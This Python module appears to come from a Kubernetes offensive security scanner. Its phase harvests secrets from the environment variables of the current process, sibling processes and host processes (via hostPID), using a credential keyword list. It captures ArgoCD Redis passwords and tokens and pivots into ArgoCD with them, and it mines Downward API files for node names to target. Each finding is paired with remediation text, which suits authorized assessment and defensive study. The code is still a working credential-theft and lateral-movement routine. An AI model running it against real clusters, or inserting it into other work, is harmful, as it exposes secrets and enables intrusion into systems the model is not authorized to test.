"""Process credential harvesting engine."""

from __future__ import annotations

import json
import os

from kubexhunt.core.legacy import load_legacy_module
from kubexhunt.engines.base import LegacyFunctionEngine


def run_phase_proc_harvest(legacy) -> None:
    """Execute the extracted /proc harvesting phase."""

    legacy.CURRENT_PHASE = legacy.STATE.current_phase = "19"
    legacy.phase_header(
        "19",
        "/proc Credential Harvesting",
        "Process env harvesting, Downward API abuse, hostPID process scanning",
    )

    cred_kw = [
        "password",
        "passwd",
        "secret",
        "token",
        "api_key",
        "apikey",
        "database_url",
        "db_pass",
        "redis_pass",
        "mongo_pass",
        "private_key",
        "access_key",
        "auth_key",
    ]
    skip_kw = ["kubernetes", "service_port", "service_host", "_path", "_home", "shell", "term", "lang"]

    legacy.section("/proc/self/environ (Current Process)")
    self_env = legacy.file_read("/proc/self/environ")
    if self_env:
        creds = []
        for env_var in self_env.split("\x00"):
            if "=" in env_var:
                key, _, value = env_var.partition("=")
                key_lower = key.lower()
                if any(keyword in key_lower for keyword in cred_kw) and not any(
                    keyword in key_lower for keyword in skip_kw
                ):
                    creds.append(f"{key}={value[:60]}")
        if creds:
            legacy.finding(
                "HIGH",
                "Credentials in current process /proc/self/environ",
                "\n".join(creds[:8]),
                "Do not pass credentials as env vars | Use mounted secret files",
            )
        else:
            legacy.finding("PASS", "No credentials in current process environ", "")

    legacy.section("/proc/*/environ — Other Processes in Same Pod")
    all_creds = []
    pod_pids = {str(os.getpid())}
    try:
        our_cgroup = legacy.file_read("/proc/self/cgroup") or ""
        for pid in os.listdir("/proc"):
            if not pid.isdigit() or pid == str(os.getpid()):
                continue
            env_data = legacy.file_read(f"/proc/{pid}/environ")
            if not env_data:
                continue
            comm = (legacy.file_read(f"/proc/{pid}/comm") or "").strip()
            pid_cgroup = legacy.file_read(f"/proc/{pid}/cgroup") or ""
            our_last = our_cgroup.split("\n")[0].split("/")[-1] if our_cgroup else ""
            pid_last = pid_cgroup.split("\n")[0].split("/")[-1] if pid_cgroup else ""
            same_pod = our_last and pid_last and our_last == pid_last
            if same_pod:
                pod_pids.add(pid)
            for env_var in env_data.split("\x00"):
                if "=" not in env_var:
                    continue
                key, _, value = env_var.partition("=")
                key_lower = key.lower()
                if (
                    any(keyword in key_lower for keyword in cred_kw)
                    and not any(keyword in key_lower for keyword in skip_kw)
                    and value
                ):
                    all_creds.append(f"PID {pid} ({comm}): {key}={value[:60]}")
                    if "redis" in key_lower and "pass" in key_lower:
                        legacy.CTX["argocd_redis_pass"] = value.strip()
                    if key_lower in ("argocd_token", "argocd_auth_token") and value.startswith("ey"):
                        legacy.CTX["argocd_token"] = value.strip()
                    if "argocd" in comm.lower() or "argocd" in key_lower:
                        legacy.CTX["argocd_detected"] = True
    except OSError:
        pass

    if all_creds:
        legacy.finding(
            "HIGH",
            "Credentials harvested from other processes in same pod",
            "\n".join(all_creds[:8]),
            "Remove env var credentials | Use mounted secrets at file level",
        )
        legacy.add_attack_edge(
            "Compromised Pod",
            "Co-located Secrets",
            "/proc/*/environ → credential harvest from sibling processes",
            "HIGH",
        )
    else:
        legacy.finding(
            "PASS",
            "No credentials found in co-process /proc environ",
            "Either no co-processes or they use no plain-text credentials",
        )

    legacy.section("hostPID — Host Process Scanning")
    pid1 = (legacy.file_read("/proc/1/comm") or "").strip()
    if pid1 in ("systemd", "init", "bash", "sh"):
        host_creds = []
        interesting_procs = []
        host_keywords = ["kube", "etcd", "docker", "containerd", "vault", "consul", "postgres", "mysql"]
        try:
            for pid in os.listdir("/proc"):
                if not pid.isdigit() or pid in pod_pids:
                    continue
                comm = (legacy.file_read(f"/proc/{pid}/comm") or "").strip()
                cmdline = (legacy.file_read(f"/proc/{pid}/cmdline") or "").replace("\x00", " ").strip()
                if any(keyword in comm.lower() or keyword in cmdline.lower() for keyword in host_keywords):
                    interesting_procs.append(f"{pid}:{comm}")
                    env_data = legacy.file_read(f"/proc/{pid}/environ") or ""
                    for env_var in env_data.split("\x00"):
                        if "=" not in env_var:
                            continue
                        key, _, value = env_var.partition("=")
                        key_lower = key.lower()
                        if (
                            any(keyword in key_lower for keyword in cred_kw)
                            and not any(keyword in key_lower for keyword in skip_kw)
                            and value
                        ):
                            host_creds.append(f"PID {pid} ({comm}): {key}={value[:60]}")
                            if "redis" in key_lower and "pass" in key_lower:
                                legacy.CTX["argocd_redis_pass"] = value.strip()
        except OSError:
            pass
        if host_creds:
            legacy.finding(
                "CRITICAL",
                "Credentials harvested from HOST processes via hostPID",
                "\n".join(host_creds[:8]),
                "Remove hostPID: true | Never run privileged pods",
            )
            legacy.add_attack_edge(
                "hostPID Access",
                "Node Credentials",
                "Host process /proc/*/environ → kubelet/etcd creds",
                "CRITICAL",
            )
        else:
            legacy.finding(
                "PASS",
                "No credentials in host-level processes",
                "Host processes (kubelet, containerd, etcd) have no plain-text credentials in environ",
            )
        if interesting_procs:
            legacy.finding(
                "HIGH",
                "Sensitive host processes visible via hostPID",
                f"Processes: {','.join(interesting_procs[:8])}",
                "Remove hostPID: true from pod spec",
            )
    else:
        legacy.finding("PASS", "hostPID not enabled — only pod processes visible", "")

    if (legacy.CTX.get("argocd_detected") or legacy.CTX.get("argocd_redis_pass")) and not any(
        "ArgoCD Deep" in finding.get("check", "")
        or "ArgoCD repository" in finding.get("check", "")
        or "ArgoCD Applications" in finding.get("check", "")
        for finding in legacy.FINDINGS
    ):
        legacy.info_line("ArgoCD detected via /proc — pivoting with stolen credentials...")
        legacy._enumerate_argocd()

    legacy.section("Downward API Abuse")
    for downward_path in ["/etc/podinfo", "/etc/pod-info", "/etc/pod_info"]:
        if os.path.isdir(downward_path):
            try:
                files = os.listdir(downward_path)
                content = {name: (legacy.file_read(os.path.join(downward_path, name)) or "").strip() for name in files}
                legacy.finding(
                    "INFO",
                    "Downward API volume mounted",
                    f"Path: {downward_path}\nFiles: {', '.join(files)}\n"
                    f"Content: {json.dumps(content, indent=2)[:300]}\n"
                    "Node name revealed → target kubelet API on specific node",
                    "Limit Downward API to only required fields",
                )
                if "nodeName" in str(content) or "spec.nodeName" in str(content):
                    node_name = content.get("nodeName", "") or content.get("spec.nodeName", "")
                    if node_name:
                        legacy.info_line(f"Node name from Downward API: {node_name} — adding to kubelet targets")
                        if node_name not in legacy.CTX.get("node_ips", []):
                            resolved = legacy.dns_resolve(node_name)
                            if resolved:
                                ips = legacy.CTX.get("node_ips", [])
                                ips.append(resolved)
                                legacy.CTX["node_ips"] = ips
            except OSError:
                pass


class ProcHarvestEngine(LegacyFunctionEngine):
    """Compatibility wrapper around the extracted phase 19 /proc logic."""

    def __init__(self) -> None:
        super().__init__(name="proc_harvest", phase="19", function_name="phase_proc_harvest")

    async def run(self, _context, _config, _state, _api_client):
        """Execute the extracted proc-harvest engine."""

        legacy = load_legacy_module()
        before = len(legacy.FINDINGS)
        run_phase_proc_harvest(legacy)
        return legacy.FINDINGS[before:]
